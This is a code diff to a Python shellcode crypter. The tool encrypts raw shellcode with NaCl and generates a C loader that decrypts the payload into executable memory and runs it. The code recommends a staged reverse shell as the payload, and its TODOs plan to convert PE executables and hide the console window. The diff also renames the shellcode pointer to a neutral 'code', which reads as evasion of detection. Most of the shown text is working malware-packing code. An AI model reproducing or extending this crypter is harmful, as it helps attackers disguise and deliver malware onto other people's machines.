@@ -1,3 +1,8 @@
+# TODO:
+# Make folder for each shell
+# Take PE exe as input, by removing headers
+# Ask if exe should spawn window
+# Ask if exe should be static
 import nacl.secret
 import nacl.utils
 from nacl.pwhash import argon2id
@@ -5,7 +10,6 @@ from pathlib import Path
 import cryptonite_parser
 from rich.prompt import Prompt
 import os
-
 
 def read_file(filename: str) -> bytes:
     """Read and return file content as bytes."""
@@ -52,7 +56,7 @@ def save_data_to_file(data: str, prompt: str = "Save to file?") -> None:
 
 def encrypt_file(filename: str = "", key: bytes = None) -> bytes:
     """Encrypt a file and save the result."""
-    key = key or (generate_key() if yes_no("Generate a key?") else ask_key(ask_load_key=True))
+    key = key if key else ask_key(ask_generate_key=True) 
     
     filename = filename or input("Filename: ")
     while not Path(filename).exists():
@@ -159,11 +163,14 @@ def decrypt_phrase(encrypted_data: str = "", key: bytes = None) -> bytes:
 
     return decrypted_data
 
+def generate_salt() -> bytes:
+    """Generate 16 byte salt"""
+    return nacl.utils.random(16)
 
 def generate_key_from_password(password: str = "", salt: bytes = None) -> bytes:
     """Generate a key from a password and salt using Argon2."""
     password = password or input("Password: ")
-    salt = salt or nacl.utils.random(16)
+    salt = generate_salt()
 
     key = argon2id.kdf(
         nacl.secret.SecretBox.KEY_SIZE,
@@ -185,20 +192,21 @@ def valid_hex(hex_string: str) -> bool:
         return False
 
 
-def shellcode_c_crypter(shellcode_filename: str = "", key: bytes = None, output_filename="crypted.c") -> None:
+def shellcode_c_crypter(shellcode_filename: str = "", key: bytes = None, platform: str = "", output_filename = "crypted.c") -> str:
     """Encrypt shellcode and generate a C template."""
     print("[!] Recommended payload is staged reverse shell.\n")
     key = key or generate_key()
-    shellcode_filename = input_file()
+    shellcode_filename = shellcode_filename or input_file()
 
     encrypted_data = encrypt_file(shellcode_filename, key)
     data_c_array = bytes_to_c_array(encrypted_data)
     key_c_array = bytes_to_c_array(key)
 
-    c_template = create_c_template(data_c_array, key_c_array)
+    c_template = create_c_template(data_c_array, key_c_array, platform=platform)
     write_to_file(output_filename, c_template, "w")
     
     print(f"C code has been written to {output_filename}")
+    return c_template
 
 
 def create_c_template(encrypted_data_array: str, key_array: str, platform: str = "") -> str:
@@ -254,14 +262,16 @@ int main() {{
     }}
 
     memcpy(exec_mem, decrypted, sizeof(decrypted));
-    void (*shellcode)() = (void(*)())exec_mem;
-    shellcode();
+    void (*code)() = (void(*)())exec_mem;
+    code();
 
     {mem_free[platform]}
     return 0;
 }}
 """
 
+
+# Den är ej implementerad än
 def compile_c_to_exe(filename: str, platform: str = "", compiler="", options="", output: str = "out") -> bool:
     """Compile generated c file to executable."""
     platform = platform.lower()
